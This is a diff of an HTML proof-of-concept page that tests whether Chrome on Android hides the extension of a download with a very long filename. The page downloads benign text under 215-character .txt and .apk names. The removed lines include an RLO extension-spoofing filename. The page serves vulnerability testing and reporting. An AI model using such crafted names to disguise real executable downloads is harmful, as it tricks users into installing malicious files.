@@ -3,99 +3,84 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Chrome Android download filename truncation PoC</title>
+<title>Download filename truncation (extension hidden)</title>
 <style>
   :root { color-scheme: light dark; }
   body { font-family: system-ui, sans-serif; margin: 1.25rem; line-height: 1.45; max-width: 46rem; }
-  h1 { font-size: 1.35rem; }
-  h2 { font-size: 1.05rem; margin-top: 1.5rem; }
-  button { font: inherit; padding: .6rem .9rem; margin: .25rem .25rem .25rem 0;
+  h1 { font-size: 1.4rem; }
+  h2 { font-size: 1.05rem; margin-top: 1.4rem; }
+  button { font: inherit; padding: .65rem 1rem; margin: .3rem .3rem .3rem 0;
            border: 1px solid #888; border-radius: .5rem; background: #f4f4f4; color: #111; }
   button:active { background: #ddd; }
-  code, pre { font-family: ui-monospace, monospace; }
   pre { background: #f0f0f0; color: #111; padding: .75rem; border-radius: .4rem;
         white-space: pre-wrap; word-break: break-all; }
   .note { background: #fff8dc; color: #111; padding: .75rem; border-radius: .4rem; }
-  .muted { color: #666; }
   table { border-collapse: collapse; width: 100%; }
   th, td { border: 1px solid #bbb; padding: .35rem .45rem; text-align: left; vertical-align: top; }
+  code { font-family: ui-monospace, monospace; }
 </style>
 </head>
 <body>
-<h1>Chrome Android download filename truncation PoC</h1>
+<h1>Download filename truncation (extension hidden)</h1>
 
-<p>
-  Each button creates a tiny <code>text/plain</code> Blob (<code>test</code>) and downloads it with a
-  crafted filename. No server is needed once this page is loaded/hosted. After each download, open
-  <b>Chrome &rarr; Downloads</b> and check whether the final extension is visible.
-</p>
+<h2>Baseline</h2>
+<div><button onclick="normal()">Normal</button></div>
 
-<h2>Tests</h2>
-<button onclick="dl('apk215')">215-char .apk</button>
-<button onclick="dl('txt215')">215-char .txt (control)</button>
-<button onclick="dl('apk100')">100-char .apk</button>
-<button onclick="dl('apk30')">30-char .apk (control)</button>
-<button onclick="dl('rlo')">RLO .exe (negative control)</button>
+<h2>Truncation tests (same 215-character length)</h2>
+<div><button onclick="longAsciiTxt()">215-char .txt</button></div>
+<div><button onclick="longAsciiApk()">215-char .apk (may show "file might be harmful")</button></div>
 
 <pre id="log">No download triggered yet.</pre>
 
 <h2>What to look for</h2>
 <table>
-  <tr><th>Test</th><th>Filename length</th><th>Expected if vulnerable</th></tr>
-  <tr><td>215-char .apk</td><td>215</td><td>Downloads title shows <code>aaaa…</code> and <b>no .apk</b></td></tr>
-  <tr><td>215-char .txt</td><td>215</td><td>If <code>.txt</code> is also hidden, it is a general long-name truncation;
-      if <code>.txt</code> stays visible, the .apk case is type/layout specific</td></tr>
-  <tr><td>100-char .apk</td><td>100</td><td>Same question at a shorter length (threshold finding)</td></tr>
-  <tr><td>30-char .apk</td><td>30</td><td>Should show <code>.apk</code>; if not, the bug is even broader</td></tr>
-  <tr><td>RLO .exe</td><td>15</td><td>Expected <code>invoice_fdp.exe</code> (U+202E is replaced with <code>_</code>)</td></tr>
+  <tr><th>Button</th><th>Filename</th><th>Expected if vulnerable</th></tr>
+  <tr><td>Normal</td><td>long ASCII <code>harmless…​.txt</code></td>
+      <td><code>.txt</code> visible</td></tr>
+  <tr><td>215-char .txt</td><td>211 × <code>a</code> + <code>.txt</code></td>
+      <td>If <code>.txt</code> also disappears, this is a <b>generic long-name</b> truncation;
+          if <code>.txt</code> stays visible while <code>.apk</code> does not, the truncation is
+          <code>.apk</code>/layout specific</td></tr>
+  <tr><td>215-char .apk</td><td>211 × <code>a</code> + <code>.apk</code></td>
+      <td>If <code>.apk</code> disappears, same Downloads-list path; Chrome may show a
+          "file might be harmful" warning first</td></tr>
 </table>
 
-<p class="note">
-  <b>Report criteria:</b> the strongest finding is a <b>.apk</b> whose extension disappears while
-  the equally long <b>.txt</b> keeps its extension. If both disappear, describe it as a general
-  long-filename truncation, not a Unicode-specific one. Capture the Chrome version, device model,
-  and a screen recording of the Downloads screen.
-</p>
-
-<p class="muted">
-  The RLO test is a negative control: current Chromium replaces Unicode
-  <code>[:Cf:]</code> characters (including U+202E) with <code>_</code> in
-  <code>net::GenerateFileName</code>, so it should download as
-  <code>invoice_fdp.exe</code>. If it visually shows <code>invoiceexe.pdf</code>, that is a
-  separate, more serious bug.
-</p>
 
 <script>
-  const A = 'a'.repeat(211);          // 211 + 4 = 215
-  const B = 'a'.repeat(96);           // 96 + 4 = 100
-  const C = 'a'.repeat(26);           // 26 + 4 = 30
+  // Original "Normal" filename: long ASCII name, extension should stay visible.
+  const NORMAL_NAME = 'harmless' + 's'.repeat(126) + '.txt';
 
-  const cases = {
-    apk215: { name: A + '.apk' },
-    txt215: { name: A + '.txt' },
-    apk100: { name: B + '.apk' },
-    apk30:  { name: C + '.apk' },
-    rlo:    { name: 'invoice\u202efdp.exe' },
-  };
+  // Exact 215 UTF-16 code units, pure ASCII.
+  const ASCII_TXT = 'a'.repeat(211) + '.txt';
+  const ASCII_APK = 'a'.repeat(211) + '.apk';
 
-  function dl(key) {
-    const c = cases[key];
-    const blob = new Blob(['test'], { type: 'text/plain' });
-    const url = URL.createObjectURL(blob);
+  function download(name) {
     const a = document.createElement('a');
-    a.href = url;
-    a.download = c.name;
+    a.download = name;
+    // Benign plain text. The filename is the only thing under test.
+    a.href = 'data:text/plain,benign%20test%20payload';
     document.body.appendChild(a);
     a.click();
     a.remove();
-    setTimeout(() => URL.revokeObjectURL(url), 10000);
 
-    const shown = c.name.replace(/\u202e/g, '<U+202E>');
     document.getElementById('log').textContent =
-      'Triggered: ' + key + '\n' +
-      'length: ' + c.name.length + ' UTF-16 code units\n' +
-      'download attribute: ' + shown + '\n\n' +
+      'Triggered\n' +
+      'length: ' + name.length + ' UTF-16 code units\n' +
+      'filename: ' + name + '\n\n' +
       'Now open Chrome -> Downloads and check the ending.';
+  }
+
+  function normal() {
+    download(NORMAL_NAME);
+  }
+
+  function longAsciiTxt() {
+    download(ASCII_TXT);
+  }
+
+  function longAsciiApk() {
+    download(ASCII_APK);
   }
 </script>
 </body>
